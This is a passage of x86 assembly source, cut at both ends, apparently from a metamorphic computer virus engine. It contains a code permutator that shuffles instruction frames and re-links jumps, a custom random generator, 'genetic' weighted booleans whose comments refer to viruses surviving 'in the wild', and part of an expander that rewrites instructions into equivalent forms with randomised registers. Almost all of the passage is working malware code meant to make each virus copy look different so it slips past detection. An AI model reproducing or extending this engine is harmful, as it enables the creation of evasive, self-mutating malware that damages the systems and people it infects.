                push    ebx       ; the conflictive instructions are inserted
                sub     ebx, esi  ; in the same frame. The others don't
                add     eax, ebx  ; matter if they are wherever we want.
                add     esi, ebx
                mov     [edi+4], esi
                pop     ebx
                jmp   @@DontAdd10hYet
    @@CheckInst_Next01:
                add     edi, 8     ; Increase the frame pointer
                sub     ecx, eax
                cmp     ecx, 01E0h ; Are we inside our last instructions?
                jae   @@NextFrame  ; If we aren't, generate another
                or      ecx, ecx   ; If we have arrived until the last
                jz    @@FramesCreationFinished  ; instruction, it's finished.
                mov     [edi], esi           ; Insert the instruction of this
                add     esi, ecx             ; frame and the last instruction.
                mov     [edi+4], esi
                add     edi, 8
    @@FramesCreationFinished:
                mov     [ebp+AddressOfLastFrame], edi ; Set the last frame.
    @@TempLabel:

        ;; Calculate MOD
                mov     eax, edi               ; Get a value we can use for
                mov     ebx, [ebp+FramesTable] ; mask a random number. The
                sub     eax, ebx               ; value is got from the total
                ; EAX = Number of frames * 8   ; number of frames.
                mov     ebx, 8
        @@LoopCalculateMOD:
                shl     ebx, 1
                cmp     ebx, eax
                jb    @@LoopCalculateMOD
                sub     ebx, 8
                mov     [ebp+MODValue], ebx

     ;; Now we have frames that we can permutate. We save the address of
     ;; the first frame to know where to jump when the code is reassembled
                mov     esi, [ebp+FramesTable]
                mov     [ebp+PositionOfFirstInstruction], esi

     ;; The frames are permutated. We have taken in account the first
     ;; instruction and we save everytime the address where the first
     ;; instruction is.
     ;; ESI = Table of frames
     ;; EDI = Address of last frame
                mov     edx, esi
      @@LoopExchange:
                call    Random
                mov     ebx, [ebp+MODValue]
                and     eax, ebx
                add     eax, esi     ; Get frame in EAX

; ; Uncommenting this instruction the engine doesn't permutate anything
; ; (used to avoid getting crazy while finding bugs in regenerated codes)
;                mov     eax, edx

                cmp     eax, edi     ; Frame address > last frame address?
                jae   @@LoopExchange ; If so, get other random frame
                mov     ecx, [eax]   ; Exchange frame at EDX with the random
                mov     ebx, [edx]   ; frame got above.
                mov     [eax], ebx
                mov     [edx], ecx   ; Be aware of first instruction position!
                cmp     edx, [ebp+PositionOfFirstInstruction]
                jnz   @@LookEAX
                mov     [ebp+PositionOfFirstInstruction], eax
                jmp   @@ExchangeNext
         @@LookEAX:
                cmp     eax, [ebp+PositionOfFirstInstruction]
                jnz   @@ExchangeNext
                mov     [ebp+PositionOfFirstInstruction], edx
         @@ExchangeNext:
                add     eax, 4
                add     edx, 4
                mov     ecx, [eax]   ; Exchange frame
                mov     ebx, [edx]
                mov     [eax], ebx
                mov     [edx], ecx
                add     edx, 4       ; Next frame
                cmp     edx, edi     ; Last frame?
                jb    @@LoopExchange ; If not, exchange next

        ;; Now we are going to copy the instructions and update the label
        ;; addresses in the label table. We include NOPs because they can
        ;; have a label over them, and if we eliminate them the label
        ;; updating will be problematic.

                mov     esi, [ebp+InstructionTable]
                mov     edi, [ebp+PermutationResult]
                mov     ebx, [ebp+FramesTable]

                mov     eax, [ebp+PositionOfFirstInstruction]
                cmp     ebx, eax
                jnz   @@InsertJump2
      @@LoopCopyFrame:
                mov     eax, 0FFh
                mov     [ebp+Permut_LastInstruction], eax
                mov     edx, [ebx]      ; Get the start and end address of the
                add     ebx, 4          ; frame and copy the instructions.
                mov     ecx, [ebx]
                add     ebx, 4
      @@LoopCopyInstructions:
                mov     eax, [edx]
                cmp     al, 4Fh         ; If we find a remaining pseudoopcode
                jnz   @@NextInstruction ; 4F from the shrinking part, we
                mov     al, 51h         ; substitute it by the correct one:
                mov     [edx], eax      ; PUSH Mem2/POP Mem
                push    eax
                push    ebx
                mov     ebx, [edx+7]
                mov     eax, 59h
                mov     [ebx], al
                pop     ebx
                pop     eax
         @@NextInstruction:
                mov     [edi], eax      ; Copy the instruction
                mov     eax, [edx+4]
                mov     [edi+4], eax
                mov     eax, [edx+8]
                mov     [edi+8], eax
                mov     [edi+0Ch], edx  ; Set pointer to old code
                mov     [edx+0Ch], edi  ; Set pointer to new code
                mov     eax, [edi]
                and     eax, 0FFh       ; NOP?
                cmp     eax, 0FFh
                jz    @@NextInstruction2
        @@SetLastInstruction:
             ;   mov     eax, [edi]      ; Save opcode for later
             ;   and     eax, 0FFh
                mov     [ebp+Permut_LastInstruction], eax
                jmp   @@NextInstruction3
        @@NextInstruction2:
                mov     eax, [edi+0Bh]   ; Label over a NOP?
                and     eax, 0FFh
                or      eax, eax         ; If so, jump to fix the problem
                jnz   @@SetLastInstruction
        @@NextInstruction3:
                add     edi, 10h         ; Next instruction in the frame
                add     edx, 10h
                cmp     edx, ecx         ; Last instruction in the frame?
                jnz   @@LoopCopyInstructions  ; If not, loop to copy
                mov     eax, [ebp+AddressOfLastFrame] ; Check if it's the last
                cmp     ebx, eax                  ; frame of the code (not of
                jae   @@LastFrameArrived          ; the table)
                mov     eax, [ebx]           ; Get the frame in the table
                cmp     eax, edx             ; Is it the same?
                jz    @@LoopTestIfLastFrame  ; Check if it's the last frame
                                             ; of the permutation table
       @@LastFrameArrived:
                mov     eax, [ebp+Permut_LastInstruction]
                cmp     eax, 0E9h  ; JMP <label> opcode
                jz    @@LoopTestIfLastFrame
                cmp     eax, 0EBh  ; JMP Mem opcode
                jz    @@LoopTestIfLastFrame
                cmp     eax, 0EDh  ; JMP Reg opcode
                jz    @@LoopTestIfLastFrame
                cmp     eax, 0FEh  ; RET
                jz    @@LoopTestIfLastFrame
                mov     [edi+1], edx  ; Set the new label
      @@InsertJump:
                mov     eax, 0E9h     ; JMP opcode
                mov     [edi], al     ; Set the JMP to the new label
                ; EDI = Jump to update
                call    InsertJumpInTable ; Insert it in the table for later
                add     edi, 10h      ; Next instruction
      @@LoopTestIfLastFrame:
                mov     eax, [ebp+AddressOfLastFrame] ; Are we in the end of
                cmp     ebx, eax                   ; the table?
                jae   @@End               ; If so, end instruction copy
                jmp   @@LoopCopyFrame     ; If not, jump to continue the copy
      @@InsertJump2:
                mov     eax, [eax]        ; Get the label
                mov     [edi+1], eax      ; Put it as label (but later will
                jmp   @@InsertJump        ; be substituted)

         ; Here we have all instructions copied, and all the labels and jumps
         ; to other blocks waiting to be updated
      @@End:    mov     [ebp+AddressOfLastInstruction], edi
                                        ; Update last instruction address
                mov     ecx, [ebp+NumberOfLabels]
                mov     edx, [ebp+LabelTable]
        @@LoopUpdateLabel:
                mov     eax, [edx+4]    ; Pointer to old code
                mov     ebx, [eax+0Ch]  ; New position (directly from the
                                        ;  instruction)
                mov     [edx], ebx      ; Set new pointer in label
                add     edx, 8
                sub     ecx, 1
                or      ecx, ecx
                jnz   @@LoopUpdateLabel ; Next entry

        ; Now we update the inserted permutation jumps
        ; EDX = Pointer to label insert point (from the code above)
                mov     ecx, [ebp+NumberOfJumps]
                mov     ebx, [ebp+JumpsTable]
                jmp   @@CheckNumberOfJumps
        @@LoopUpdateJumps:
                mov     esi, [ebx]     ; Jump address
                mov     eax, [esi+1]   ; Get jump destination
                mov     edi, [eax+0Ch] ; Get new address
                mov     [edx], edi     ; Label pointer to new code
                mov     [edx+4], eax   ; Label pointer to old code
                mov     [esi+1], edx   ; Set label in jump
                mov     eax, [ebp+NumberOfLabels]
                add     eax, 1
                mov     [ebp+NumberOfLabels], eax
                add     edx, 8      ; Next new label pointer
                add     ebx, 4      ; Next jump to update
                sub     ecx, 4
        @@CheckNumberOfJumps:
                or      ecx, ecx
                jnz   @@LoopUpdateJumps
         ;; All is OK in this point
                ret
PermutateCode   endp

;; Little function to insert jumps in the table.
InsertJumpInTable proc
                mov     ecx, [ebp+NumberOfJumps]
                mov     edx, [ebp+JumpsTable]
                add     edx, ecx
                mov     [edx], edi
                add     ecx, 4
                mov     [ebp+NumberOfJumps], ecx
                ret
InsertJumpInTable endp

;; Random number generator. It's used along the engine.
Random          proc
                push    edx
                push    ecx
                mov     eax, [ebp+RndSeed1]
                mov     ecx, [ebp+RndSeed2]
                add     eax, ecx
                call    RandomMod1
                xor     eax, [ebp+RndSeed1]
                mov     [ebp+RndSeed1], eax

                mov     ecx, eax
                mov     eax, [ebp+RndSeed2]
                add     [ebp+RndSeed2], ecx
                call    RandomMod2
                xor     eax, [ebp+RndSeed2]
                mov     [ebp+RndSeed2], eax
                xor     eax, [ebp+RndSeed1]
                call    RandomMod2
                pop     ecx
                pop     edx
                ret
Random          endp

RandomMod1      proc
                mov     edx, eax
                and     edx, 1FFFh
                shl     edx, 13h
                and     eax, 0FFFFFE00h
                shr     eax, 0Dh
                or      eax, edx
                add     eax, ecx
                ret
RandomMod1      endp

RandomMod2      proc
                mov     edx, eax
                and     edx, 1FFFFh
                shl     edx, 0Fh
                and     eax, 0FFFFE000h
                shr     eax, 11h
                or      eax, edx
                add     eax, ecx
                ret
RandomMod2      endp

;; Other wide-used function. Returns TRUE or FALSE in EAX.
RandomBoolean   proc
                call    Random
                and     eax, 1
                ret
RandomBoolean   endp


;; Booleans based on a little genetic algorithm. Each boolean is a
;; better-than-random number based on the previous random numbers generated
;; with these ones. The viruses that keep in the wild will have accurated
;; behaviours based on these weights.
RandomBoolean_X000_3 proc
                push    ebx
                mov     ebx, [ebp+Weight_X000_3]
                call    CheckForBooleanWeight
                mov     [ebp+Weight_X000_3], ebx
                pop     ebx
                ret
RandomBoolean_X000_3 endp

RandomBoolean_X004_7 proc
                push    ebx
                mov     ebx, [ebp+Weight_X004_7]
                call    CheckForBooleanWeight
                mov     [ebp+Weight_X004_7], ebx
                pop     ebx
                ret
RandomBoolean_X004_7 endp

RandomBoolean_X008_11 proc
                push    ebx
                mov     ebx, [ebp+Weight_X008_11]
                call    CheckForBooleanWeight
                mov     [ebp+Weight_X008_11], ebx
                pop     ebx
                ret             
RandomBoolean_X008_11 endp

RandomBoolean_X012_15 proc
                push    ebx
                mov     ebx, [ebp+Weight_X012_15]
                call    CheckForBooleanWeight
                mov     [ebp+Weight_X012_15], ebx
                pop     ebx
                ret             
RandomBoolean_X012_15 endp

RandomBoolean_X016_19 proc
                push    ebx
                mov     ebx, [ebp+Weight_X016_19]
                call    CheckForBooleanWeight
                mov     [ebp+Weight_X016_19], ebx
                pop     ebx
                ret             
RandomBoolean_X016_19 endp

RandomBoolean_X020_23 proc
                push    ebx
                mov     ebx, [ebp+Weight_X020_23]
                call    CheckForBooleanWeight
                mov     [ebp+Weight_X020_23], ebx
                pop     ebx
                ret
RandomBoolean_X020_23 endp

;; Function to save code above.
CheckForBooleanWeight proc
                push    ecx
                push    edx
                mov     ecx, ebx    ; Get the sub-weight to use
                cmp     eax, 1
                jz    @@Check1
                cmp     eax, 2
                jz    @@Check2
                cmp     eax, 3
                jz    @@Check3
      @@Check0: and     ecx, 0000000FFh
                mov     edx, 000000001h
                jmp   @@Shr00
      @@Check1: and     ecx, 00000FF00h
                mov     edx, 000000100h
                jmp   @@Shr08
      @@Check2: and     ecx, 000FF0000h
                mov     edx, 000010000h
                jmp   @@Shr10
      @@Check3: and     ecx, 0FF000000h
                mov     edx, 001000000h

       @@Shr18: shr     ecx, 8
       @@Shr10: shr     ecx, 8
       @@Shr08: shr     ecx, 8      ; Set it at the beginning of ECX
       @@Shr00:
                call    Random      ; Get a random number in range 0-255
                and     eax, 0FFh
                cmp     eax, ecx    ; If it's above/equal the weight, jump
                jae   @@Above
      @@Below:  cmp     ecx, 0F8h   ; If it has already the max value, don't
                jae   @@Return0     ; touch the weight
                call    Random
                and     eax, 0Fh    ; True-random modification (some randomness
                or      eax, eax    ; in the life of viriis :)
                jz    @@Return0
                add     ebx, edx    ; Make more probability to FALSE
                add     ecx, 1
                call    Random
                and     eax, 0Fh    ; Again?
                or      eax, eax
                jz    @@Below
     @@Return0: xor     eax, eax
                pop     edx
                pop     ecx
                ret
      @@Above:  cmp     ecx, 08h    ; If it has already the min value, don't
                jb    @@Return1     ; decrease the weight
                call    Random
                and     eax, 0Fh    ; Randomness
                or      eax, eax
                jz    @@Return1
                sub     ebx, edx    ; Make more probability to TRUE
                sub     ecx, 1
                call    Random
                and     eax, 0Fh    ; Again?
                or      eax, eax
                jz    @@Above
     @@Return1: mov     eax, 1
                pop     edx
                pop     ecx
                ret
CheckForBooleanWeight endp
;;
;;
;; End of permutator.
;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;


;; KEYWORD: Key_!Xpander
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;; ********************************************************************** ;;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;
;; The expander
;; ------------
;;
;; This routine expands a shrinked pseudo-asm code previously shrinked with
;; the shrinker module. It's more easy to expand here following the
;; single/pairs/triplets rules than encoding it directly in x86 asm.
;;
;; The rules of expansion are exactly the opposite ones that we use for
;; compression. For example:
;;
;; MOV [Mem],Reg
;; MOV Reg2,[Mem]    ---> MOV Reg2,Reg
;;
;; but also:
;;
;; PUSH Reg
;; POP Reg2          ---> MOV Reg2,Reg
;;
;; Then the expansion rule for MOV Reg2,Reg will be:
;;
;; MOV Reg2,Reg      ---> MOV [Mem],Reg + MOV Reg2,[Mem]
;;                   ---> PUSH Reg + POP Reg2
;;
;; where we select randomly one of the possible expansions.
;;
;; All the expansions are performed recursively, so every instruction involved
;; in an expansion will be expanded also, until we reach a recursivity level
;; specified in the variable [SizeOfExpansion] (from X to 3).
;;

XpandCode       proc
                mov     esi, [ebp+InstructionTable] ; Source of expansion
                mov     edi, [ebp+ExpansionResult]  ; Destiny of expansion

    ;; Let's get the register translation. We must have present that DeltaReg
    ;; cannot be EAX, ECX or EDX (due to API calls). Due to the usage of 8
    ;; bits registers, we saved the used 8 bits register while shrinking code,
    ;; so we must select that register first from one of the 4 first ones.

                mov     eax, [ebp+SizeOfExpansion]
                mov     [ebp+Xp_RecurseLevel], eax ; Set the initial
                                                   ; recursivity level

                mov     eax, [ebp+CreatingADecryptor] ; If we are creating
                or      eax, eax                      ; a decryptor, keep the
                jnz   @@KeepRegisterTranslation ; current register translation

                mov     eax, 8
                mov     [ebp+Xp_Register0], eax  ; Initialize the registers
                mov     [ebp+Xp_Register1], eax
                mov     [ebp+Xp_Register2], eax
                mov     [ebp+Xp_Register3], eax
                mov     [ebp+Xp_Register5], eax
                mov     [ebp+Xp_Register6], eax
                mov     [ebp+Xp_Register7], eax
                mov     eax, 4
                mov     [ebp+Xp_Register4], eax  ; Set the ESP
    @@Other8BitsReg:
                call    Random
                and     eax, 7
                cmp     eax, 3                   ; Get a 8 bits register
                ja    @@Other8BitsReg
                mov     ebx, [ebp+Register8Bits]  ; Get the saved register
                call    Xpand_SetRegister4Xlation ; Set the translation
    @@OtherDeltaReg:
                call    Random              ; Get a register
                and     eax, 7
                cmp     eax, 2              ; EAX, ECX or EDX?
                jbe   @@OtherDeltaReg       ; If so, select another
                cmp     eax, 4              ; ESP?
                jz    @@OtherDeltaReg       ; Then, select another
                mov     ebx, [ebp+DeltaRegister]
                call    Xpand_SetRegister4Xlation ; Set the register
                or      eax, eax
                jz    @@OtherDeltaReg       ; Other if it coincides with Reg8
                mov     ebx, -1         ; Set EBX = 0 at first
    @@NextRegister:
                add     ebx, 1
                cmp     ebx, [ebp+DeltaRegister] ; EBX = DeltaRegister?
                jz    @@NextRegister
                cmp     ebx, [ebp+Register8Bits] ; EBX = Register8Bits?
                jz    @@NextRegister
                cmp     ebx, 4                   ; ESP?
                jz    @@NextRegister
                cmp     ebx, 8                   ; End of loop?
                jz    @@EndOfRegisters
    @@OtherRegister:
                call    Random           ; Get a register
                and     eax, 7
                cmp     eax, 4
                jz    @@OtherRegister
                call    Xpand_SetRegister4Xlation ; Try to set the register
                or      eax, eax
                jz    @@OtherRegister    ; If it's set in another one, select
                jmp   @@NextRegister     ; another
    @@EndOfRegisters:
                mov     eax, [ebp+DeltaRegister] ; Get the Delta Register
                call    Xpand_TranslateRegister  ; Translate it
                mov     [ebp+TranslatedDeltaRegister], eax ; Save it
    @@KeepRegisterTranslation:

    @@Expand:  ; mov     eax, [esi]
                call    XpandThisInstruction  ; Call to expand the current
                add     esi, 10h              ; instruction
                cmp     esi, [ebp+AddressOfLastInstruction] ; Is it the last?
                jnz   @@Expand                              ; If not, continue
                mov     [ebp+AddressOfLastInstruction], edi
                call    Xpand_UpdateLabels    ; Update the labels along the
                ret                           ; code and finish
XpandCode       endp


;; This function checks if the register passed at EAX exists in any other
;; variable of register translation (i.e. if any other register is translated
;; to that one). If it is, it returns with EAX = 0. If not, sets the number
;; of register in EAX in the register translation variable of the register
;; EBX, and returns with EAX = 1.
Xpand_SetRegister4Xlation proc
                cmp     eax, [ebp+Xp_Register0]  ; Check if the register in
                jz    @@ReturnError              ; EAX is used by other
                cmp     eax, [ebp+Xp_Register1]  ; register to be translated
                jz    @@ReturnError              ; as that one.
                cmp     eax, [ebp+Xp_Register2]
                jz    @@ReturnError              ; If so, return with EAX = 0
                cmp     eax, [ebp+Xp_Register3]
                jz    @@ReturnError
                cmp     eax, [ebp+Xp_Register5]
                jz    @@ReturnError
                cmp     eax, [ebp+Xp_Register6]
                jz    @@ReturnError
                cmp     eax, [ebp+Xp_Register7]
                jz    @@ReturnError
                or      ebx, ebx    ; Jump to the corresponding variable
                jz    @@SetAt0      ; setting to translate the register in
                cmp     ebx, 1      ; EBX.
                jz    @@SetAt1
                cmp     ebx, 2
                jz    @@SetAt2
                cmp     ebx, 3
                jz    @@SetAt3
                cmp     ebx, 5
                jz    @@SetAt5
                cmp     ebx, 6
                jz    @@SetAt6
    @@SetAt7:   mov     [ebp+Xp_Register7], eax  ; Set for the register EBX
                jmp   @@ReturnNoError            ; the translation in EAX.
    @@SetAt0:   mov     [ebp+Xp_Register0], eax
                jmp   @@ReturnNoError
    @@SetAt1:   mov     [ebp+Xp_Register1], eax
                jmp   @@ReturnNoError
    @@SetAt2:   mov     [ebp+Xp_Register2], eax
                jmp   @@ReturnNoError
    @@SetAt3:   mov     [ebp+Xp_Register3], eax
                jmp   @@ReturnNoError
    @@SetAt5:   mov     [ebp+Xp_Register5], eax
                jmp   @@ReturnNoError
    @@SetAt6:   mov     [ebp+Xp_Register6], eax
                jmp   @@ReturnNoError
    @@ReturnError:
                xor     eax, eax     ; Return with FALSE if error
                ret
    @@ReturnNoError:
                mov     eax, 1       ; Return with TRUE if all OK
                ret
Xpand_SetRegister4Xlation endp


;; This function will translate the register in EAX by the corresponding
;; new register, also in EAX.
Xpand_TranslateRegister proc
                or      eax, eax  ; Jump to the corresponding variable usage.
                jz    @@Get0
                cmp     eax, 1
                jz    @@Get1
                cmp     eax, 2
                jz    @@Get2
                cmp     eax, 3
                jz    @@Get3
                cmp     eax, 4
                jz    @@Return    ; Return ESP for ESP (no translation).
                cmp     eax, 5
                jz    @@Get5
                cmp     eax, 6
                jz    @@Get6
                cmp     eax, 7
                jz    @@Get7
                mov     eax, 8  ; If the register is >= 8, return 8.
                ret
      @@Get7:   mov     eax, [ebp+Xp_Register7]  ; Get the translation and
                ret                              ; return.
      @@Get0:   mov     eax, [ebp+Xp_Register0]
                ret
      @@Get1:   mov     eax, [ebp+Xp_Register1]
                ret
      @@Get2:   mov     eax, [ebp+Xp_Register2]
                ret
      @@Get3:   mov     eax, [ebp+Xp_Register3]
                ret
      @@Get5:   mov     eax, [ebp+Xp_Register5]
                ret
      @@Get6:   mov     eax, [ebp+Xp_Register6]
      @@Return: ret
Xpand_TranslateRegister endp

;; This function returns the register in reverse translation, it means, the
;; register that the register in EAX is translated to. It's the inversed
;; operation that performs Xpand_TranslateRegister, so if we get a register,
;; we translate it with Xpand_TranslateRegister and we pass the result to
;; this function, we'll get the original register. This function is useful
;; to know which register we must use before the expansion when we want a
;; specific register in the expanded result.
Xpand_ReverseTranslation proc
                cmp     eax, 4
                jz    @@Return        ; Find the register in the register
                cmp     eax, [ebp+Xp_Register0] ; translation variables
                jz    @@Return0
                cmp     eax, [ebp+Xp_Register1]
                jz    @@Return1
                cmp     eax, [ebp+Xp_Register2]
                jz    @@Return2
                cmp     eax, [ebp+Xp_Register3]
                jz    @@Return3
                cmp     eax, [ebp+Xp_Register5]
                jz    @@Return5
                cmp     eax, [ebp+Xp_Register6]
                jz    @@Return6
                cmp     eax, [ebp+Xp_Register7]
                jz    @@Return7
                mov     eax, 8
      @@Return: ret                     ; When we find it, return the number
     @@Return0: xor     eax, eax        ; of register that uses that variable
                ret                     ; for translating itself.
     @@Return1: mov     eax, 1
                ret
     @@Return2: mov     eax, 2
                ret
     @@Return3: mov     eax, 3
                ret
     @@Return5: mov     eax, 5
                ret
     @@Return6: mov     eax, 6
                ret
     @@Return7: mov     eax, 7
                ret
Xpand_ReverseTranslation endp

;; To make a real metamorphism we have a way of coding every instruction, in
;; both instruction expansion and reassembling. So, we check all the possible
;; pseudo-opcodes and we make a formula for them. The formulas used here must
;; be recognized by the shrinker.
XpandThisInstruction proc
                mov     eax, [esi+0Bh]  ; Get the label
                mov     [edi+0Bh], eax  ; Copy it
                mov     [edi+0Ch], esi  ; Set the new pointers
                mov     [esi+0Ch], edi
                xor     eax, eax
                mov     al, [esi]       ; Get the opcode

                cmp     eax, 4Ch        ; Generic 32 bits operation?
                ja    @@Xpand_Next001   ; If not, jump
                xor     eax, eax
     @@Generic: mov     [ebp+Xp_8Bits], eax  ; Set the 8 bits flag (0 or 80h)
                mov     eax, [esi]
                and     eax, 78h             ; Get the operation
                mov     [ebp+Xp_Operation], eax ; Set it
                mov     eax, [esi]           ; Get the type of operation
                and     eax, 7
                or      eax, eax             ; OP Reg,Imm?
                jz    @@OPRegImm
                cmp     eax, 1               ; OP Reg,Reg?
                jz    @@OPRegReg
                cmp     eax, 2               ; OP Reg,Mem?
                jz    @@OPRegMem
                cmp     eax, 3               ; OP Mem,Reg?
                jz    @@OPMemReg
     @@OPMemImm:                             ; OP Mem,Imm
                mov     eax, [ebp+Xp_8Bits]  ; Get the 8 bits flag
                or      eax, eax             ; If 0, jump
                jz    @@OPMemImm32
                mov     eax, [esi+7]         ; Get the Imm
                and     eax, 0FFh            ; Extend the sign
                cmp     eax, 7Fh
                jbe   @@OPMemImmSet
                or      eax, 0FFFFFF00h
                jmp   @@OPMemImmSet          ; Set the value
     @@OPMemImm32:
                mov     eax, [esi+7]         ; Get the normal value if 32 bits
     @@OPMemImmSet:
                mov     [ebp+Xp_Immediate], eax ; Set the immediate
                call    Xpand_SetMemoryAddress  ; Copy the mem. address ref.
                                             ; (translating the indexes also)
                call    Xp_GenOPMemImm       ; Generate an OP Mem,Imm
                jmp   @@Ret
     @@OPRegImm:
                mov     eax, [ebp+Xp_8Bits]  ; Extend the sign for 8 bits
                or      eax, eax             ; operations
                jz    @@OPRegImm32
                mov     eax, [esi+7]
                and     eax, 0FFh
                cmp     eax, 7Fh
                jbe   @@OPRegImmSet
                or      eax, 0FFFFFF00h
                jmp   @@OPRegImmSet
       @@OPRegImm32:
                mov     eax, [esi+7]
       @@OPRegImmSet:
                mov     [ebp+Xp_Immediate], eax  ; Set the immediate
                mov     eax, [esi+1]             ; Get the register
                and     eax, 0FFh
                call    Xpand_TranslateRegister  ; Translate it to the new one
                mov     [ebp+Xp_Register], eax   ; Set it
                call    Xp_GenOPRegImm           ; Generate an OP Reg,Imm
                jmp   @@Ret
     @@OPRegReg:
                mov     eax, [esi+1]             ; Get the source register
                and     eax, 0FFh
                call    Xpand_TranslateRegister  ; Translate it and set it
                mov     [ebp+Xp_SrcRegister], eax
                mov     eax, [esi+7]             ; Get the destiny register
                and     eax, 0FFh
                call    Xpand_TranslateRegister  ; Translate it and set it
                mov     [ebp+Xp_Register], eax
                call    Xp_GenOPRegReg           ; Generate an OP Reg,Reg
                jmp   @@Ret
     @@OPRegMem:
                call    Xpand_SetMemoryAddress   ; Copy the memory address
                mov     eax, [esi+7]             ; (with indexes translation)
                and     eax, 0FFh
                call    Xpand_TranslateRegister  ; Translate the destiny reg.
                mov     [ebp+Xp_Register], eax   ; Set it
                call    Xp_GenOPRegMem           ; Generate an OP Reg,Mem
                jmp   @@Ret
     @@OPMemReg:
                call    Xpand_SetMemoryAddress   ; Copy the memory address
                mov     eax, [esi+7]             ; (with indexes translation)
                and     eax, 0FFh
                call    Xpand_TranslateRegister  ; Translate the source reg.
                mov     [ebp+Xp_Register], eax
                call    Xp_GenOPMemReg           ; Generate an OP Mem,Reg
                jmp   @@Ret

   @@Xpand_Next001:
                cmp     eax, 00h+80h        ; Get if it's a 8 bits generic
                jb    @@Xpand_Next002       ; operation
                cmp     eax, 4Ch+80h
                ja    @@Xpand_Next002
                mov     eax, 80h            ; If it is, set "8 bits usage"
                jmp   @@Generic             ; (value 80h in [Xp_8Bits]) and
                                            ; jump to make the operation

   @@Xpand_Next002:
                cmp     eax, 50h                ; PUSH Reg?
                jnz   @@Xpand_Next003
                mov     eax, [esi+1]            ; Then, translate the register
                and     eax, 0FFh               ; and set it in the
                call    Xpand_TranslateRegister ; corresponding field
                mov     [ebp+Xp_Register], eax
                call    Xp_GenPUSHReg           ; Generate a PUSH Reg
                jmp   @@Ret

   @@Xpand_Next003:
                cmp     eax, 51h               ; PUSH Mem?
                jnz   @@Xpand_Next004
                call    Xpand_SetMemoryAddress ; Then, set the memory address
                xor     eax, eax               ; (with index translation),
                mov     [ebp+Xp_8Bits], eax    ; clear the "8 bits" flag and
                call    Xp_GenPUSHMem          ; generate the PUSH Mem.
                jmp   @@Ret

   @@Xpand_Next004:
                cmp     eax, 58h                ; POP Reg?
                jnz   @@Xpand_Next005
                mov     eax, [esi+1]            ; Translate the register, set
                and     eax, 0FFh               ; it into the working field
                call    Xpand_TranslateRegister ; and generate a POP Reg
                mov     [ebp+Xp_Register], eax
                call    Xp_GenPOPReg
                jmp   @@Ret

   @@Xpand_Next005:
                cmp     eax, 59h               ; POP Mem?
                jnz   @@Xpand_Next006
                call    Xpand_SetMemoryAddress ; Then, copy the memory address
                xor     eax, eax               ; with index translation, clear
                mov     [ebp+Xp_8Bits], eax    ; the "8 bits" flag and call
                call    Xp_GenPOPMem           ; the function to generate a
                jmp   @@Ret                    ; POP Mem.

   @@Xpand_Next006:
                cmp     eax, 68h               ; PUSH Imm?
                jnz   @@Xpand_Next007
                mov     eax, [esi+7]           ; Set the immediate 
                mov     [ebp+Xp_Immediate], eax
                call    Xp_GenPUSHImm          ; Generate a PUSH Imm
                jmp   @@Ret

   @@Xpand_Next007:
                cmp     eax, 70h               ; Jcc?
                jb    @@Xpand_Next008
                cmp     eax, 7Fh
                ja    @@Xpand_Next008
                mov     [ebp+Xp_Operation], eax ; Set the type of conditional
                mov     eax, [esi+1]            ; jump in the operation field
                mov     [ebp+Xp_Immediate], eax ; and the label in the
                call    Xp_GenJcc               ; Imm field, and generate it.
                jmp   @@Ret

   @@Xpand_Next008:
                cmp     eax, 0E0h              ; NOT Reg?
                jnz   @@Xpand_Next009
                call    Xpand_SetRegister      ; Then, translate and set the
                call    Xp_GenNOTReg           ; 32 bits register and generate
                jmp   @@Ret                    ; a NOT Reg

   @@Xpand_Next009:
                cmp     eax, 0E1h              ; NOT Mem?
                jnz   @@Xpand_Next010
                call    Xpand_SetMemoryAddress ; Then, copy and translate the
                xor     eax, eax               ; memory address and indexes,
                mov     [ebp+Xp_8Bits], eax    ; set "32 bits usage" and
                call    Xp_GenNOTMem           ; generate a NOT Mem
                jmp   @@Ret

   @@Xpand_Next010:
                cmp     eax, 0E2h              ; NOT Reg8?
                jnz   @@Xpand_Next011
                call    Xpand_Set8BitsRegister ; Then, translate and set the
                call    Xp_GenNOTReg           ; 8 bits register and generate
                jmp   @@Ret                    ; a NOT Reg8

   @@Xpand_Next011:
                cmp     eax, 0E3h              ; The same as with E1 (NOT Mem)
                jnz   @@Xpand_Next012          ; but with 8 bits operands.
                call    Xpand_SetMemoryAddress
                mov     eax, 80h
                mov     [ebp+Xp_8Bits], eax
                call    Xp_GenNOTMem
                jmp   @@Ret

   @@Xpand_Next012:
                cmp     eax, 0E4h              ; NEG Reg?
                jnz   @@Xpand_Next013
                call    Xpand_SetRegister      ; Then, translate the register,
                call    Xp_GenNEGReg           ; set it and generate the op.
                jmp   @@Ret

   @@Xpand_Next013:
                cmp     eax, 0E5h              ; NEG Mem?
                jnz   @@Xpand_Next014
                call    Xpand_SetMemoryAddress ; Copy the address, translate
                xor     eax, eax               ; the indexes, set "32 bits"
                mov     [ebp+Xp_8Bits], eax    ; flag and generate the instrc.
                call    Xp_GenNEGMem
                jmp   @@Ret

   @@Xpand_Next014:
                cmp     eax, 0E6h              ; NEG Reg8?
                jnz   @@Xpand_Next015
                call    Xpand_Set8BitsRegister ; Then do the same as with
                call    Xp_GenNEGReg           ; E4 (NEG Reg) but with 8 bits
                jmp   @@Ret                    ; operands

   @@Xpand_Next015:
                cmp     eax, 0E7h              ; NEG Mem8?
                jnz   @@Xpand_Next016
                call    Xpand_SetMemoryAddress ; Then do the same as with E5
                mov     eax, 80h               ; (NEG Mem) but with a 8 bits
                mov     [ebp+Xp_8Bits], eax    ; memory address.
                call    Xp_GenNEGMem
                jmp   @@Ret

   @@Xpand_Next016:
                cmp     eax, 0E8h              ; CALL @xxx?
                jnz   @@Xpand_Next017
   @@CopyInstruction:
                mov     eax, [esi]             ; Then copy the instruction.
                mov     [edi], eax             ; It's one of the very few that
                mov     eax, [esi+4]           ; haven't a translation.
                mov     [edi+4], eax
                mov     eax, [esi+7]
                mov     [edi+7], eax
                add     edi, 10h
                jmp   @@Ret

   @@Xpand_Next017:
                cmp     eax, 0E9h              ; JMP @xxx?
                jnz   @@Xpand_Next018
                mov     eax, [esi+1]           ; Get the label, set it in the
